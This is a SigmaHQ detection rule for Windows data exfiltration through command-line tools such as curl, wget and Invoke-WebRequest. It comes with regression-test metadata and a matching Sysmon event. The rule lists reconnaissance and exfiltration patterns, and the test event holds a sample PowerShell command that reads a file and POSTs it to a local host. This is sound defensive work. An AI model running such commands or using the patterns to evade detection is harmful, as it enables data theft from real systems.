---
source: https://github.com/SigmaHQ/sigma (rules/windows/process_creation/proc_creation_win_susp_data_exfiltration_via_cli.yml + regression_data/rules/windows/process_creation/proc_creation_win_susp_data_exfiltration_via_cli/7d1aaf3d-4304-425c-b7c3-162055e0b3ab.json)
retrieved: 2026-11-15
license: Detection Rule License (DRL) 1.1 (SigmaHQ)
---

## Rule
```yaml
title: Potential Data Exfiltration Activity Via CommandLine Tools
id: 7d1aaf3d-4304-425c-b7c3-162055e0b3ab
status: test
description: Detects the use of various CLI utilities exfiltrating data via web requests
references:
    - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/
author: Nasreddine Bencherchali (Nextron Systems)
date: 2022-08-02
modified: 2025-10-19
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_iwr:
        Image|endswith:
            - '\powershell_ise.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
        CommandLine|contains:
            - 'curl '
            - 'Invoke-RestMethod'
            - 'Invoke-WebRequest'
            - 'irm '
            - 'iwr '
            - 'wget '
        CommandLine|contains|all:
            - ' -ur' # Shortest possible version of the -uri flag
            - ' -me' # Shortest possible version of the -method flag
            - ' -b'
            - ' POST '
    selection_curl:
        Image|endswith: '\curl.exe'
        CommandLine|contains: '--ur' # Shortest possible version of the --uri flag
    selection_curl_data:
        CommandLine|contains:
            - ' -d ' # Shortest possible version of the --data flag
            - ' --data '
    selection_wget:
        Image|endswith: '\wget.exe'
        CommandLine|contains:
            - '--post-data'
            - '--post-file'
    payloads:
        - CommandLine|re:
              - 'net\s+view'
              - 'sc\s+query'
        - CommandLine|contains:
              - 'Get-Content'
              - 'GetBytes'
              - 'hostname'
              - 'ifconfig'
              - 'ipconfig'
              - 'netstat'
              - 'nltest'
              - 'qprocess'
              - 'systeminfo'
              - 'tasklist'
              - 'ToBase64String'
              - 'whoami'
        - CommandLine|contains|all:
              - 'type '
              - ' > '
              - ' C:\'
    condition: (selection_iwr or all of selection_curl* or selection_wget) and payloads
falsepositives:
    - Unlikely
level: high
regression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_susp_data_exfiltration_via_cli/info.yml
```

## Regression test info
```yaml
id: 1471d9dc-da21-4a86-a713-17d26368b1ce
description: N/A
date: 2026-08-12
author: frack113
rule_metadata:
    - id: 7d1aaf3d-4304-425c-b7c3-162055e0b3ab
      title: Potential Data Exfiltration Activity Via CommandLine Tools
regression_tests_info:
    - name: Positive Detection Test
      type: evtx
      provider: Microsoft-Windows-Sysmon
      match_count: 1
      path: regression_data/rules/windows/process_creation/proc_creation_win_susp_data_exfiltration_via_cli/7d1aaf3d-4304-425c-b7c3-162055e0b3ab.evtx
```

## Matching event (JSON, from SigmaHQ regression data)
```json
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-Sysmon",
          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
        }
      },
      "EventID": 1,
      "Version": 5,
      "Level": 4,
      "Task": 1,
      "Opcode": 0,
      "Keywords": "0x8000000000000000",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2026-08-12T17:46:15.6292470Z"
        }
      },
      "EventRecordID": 478368,
      "Correlation": null,
      "Execution": {
        "#attributes": {
          "ProcessID": 3288,
          "ThreadID": 3372
        }
      },
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "SigmaCatchVm",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-18"
        }
      }
    },
    "EventData": {
      "RuleName": "technique_id=T1059.001,technique_name=PowerShell",
      "UtcTime": "2026-08-12 17:46:15.625",
      "ProcessGuid": "570E49AA-B167-6A7C-C605-000000001400",
      "ProcessId": 8436,
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "FileVersion": "10.0.26100.8875 (WinBuild.160101.0800)",
      "Description": "Windows PowerShell",
      "Product": "Microsoft® Windows® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "PowerShell.EXE",
      "CommandLine": "\"powershell.exe\" & {$content = Get-Content C:\\Windows\\System32\\notepad.exe\nInvoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content}",
      "CurrentDirectory": "C:\\Users\\frack113\\AppData\\Local\\Temp\\",
      "User": "SigmaCatchVm\\frack113",
      "LogonGuid": "570E49AA-C366-6A76-1EDD-080000000000",
      "LogonId": "0x8dd1e",
      "TerminalSessionId": 1,
      "IntegrityLevel": "High",
      "Hashes": "SHA1=613000DC53E7EF0B048021F68DD06C101994DA29,MD5=E65ECCA3754249C00F50A035202F7591,SHA256=7600FFE12DA441FE89D035B13801E8E91D064BC544A27B19A5CF49F6AB8B18F5,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77",
      "ParentProcessGuid": "570E49AA-A962-6A7C-F601-000000001400",
      "ParentProcessId": 8368,
      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"",
      "ParentUser": "SigmaCatchVm\\frack113"
    }
  }
}

```
